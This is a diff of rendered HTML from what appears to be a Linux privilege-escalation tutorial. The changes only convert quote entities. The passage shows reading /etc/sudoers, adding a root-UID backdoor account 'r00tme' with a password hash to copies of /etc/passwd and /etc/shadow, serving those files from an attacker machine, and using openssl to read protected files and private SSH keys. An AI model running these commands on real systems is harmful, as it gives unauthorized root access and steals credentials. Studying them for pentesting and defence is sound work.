@@ -26826,7 +26826,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><code>sudo</code> stands for "superuser-do". This commands changes the effective userID of the executed commands.</p>
 <p>When the <code>sudo</code> command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in <code>/etc/sudoers</code>. </p>
 <p>Therefore the  <code>/etc/sudoers</code> file specifies which users or groups are allowed to run specific programs and with what privileges.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>sudo<span class="w"> </span>cat<span class="w"> </span>/etc/sudoers<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;#&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;/^\s*$/d&#39;</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>sudo<span class="w"> </span>cat<span class="w"> </span>/etc/sudoers<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"#"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-r<span class="w"> </span><span class="s1">'/^\s*$/d'</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Sometimes we will need to know the user's password to list their <code>sudo</code> rights, but any rights entries with the <code>NOPASSWD</code> option can be seen without entering a password.</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>sudo -l
@@ -27013,10 +27013,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <p>Do the same with /etc/passwd and save it as lass.</p>
 <p>Now in your kali append the following to the /etc/passwd (lass) :</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>echo &#39;r00tme:x:0:0:root:/root:/bin/bash&#39; &gt;&gt; lass
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>echo 'r00tme:x:0:0:root:/root:/bin/bash' &gt;&gt; lass
 </span></code></pre></div></td></tr></table></div>
 <p>And append this line to the /etc/shadow (sass) file</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a>echo &#39;r00tme:$6$7aLuG8NWQCqewCyI$5ZRTVbQqx096h7u9CzIEGzz2y6DMNYn4MF2P/BodZMWvFANlb3pW2X3vtotLCETO/qh1OBqqOIWqlYooyoQ/8.:19474:0:99999:7:::&#39; &gt;&gt; sass
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a>echo 'r00tme:$6$7aLuG8NWQCqewCyI$5ZRTVbQqx096h7u9CzIEGzz2y6DMNYn4MF2P/BodZMWvFANlb3pW2X3vtotLCETO/qh1OBqqOIWqlYooyoQ/8.:19474:0:99999:7:::' &gt;&gt; sass
 </span></code></pre></div></td></tr></table></div>
 <p>Now serve these lass and sass from your kali:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a>python -m http.server 8000
@@ -27045,7 +27045,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2"></a>
 </span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3"></a>LFILE=file_to_read
 </span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4"></a>
-</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5"></a>openssl enc -in &quot;$LFILE&quot;
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5"></a>openssl enc -in "$LFILE"
 </span></code></pre></div></td></tr></table></div>
 <p>Copy the private key to your kali ~/.ssh folder:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-36-1">1</a></span>
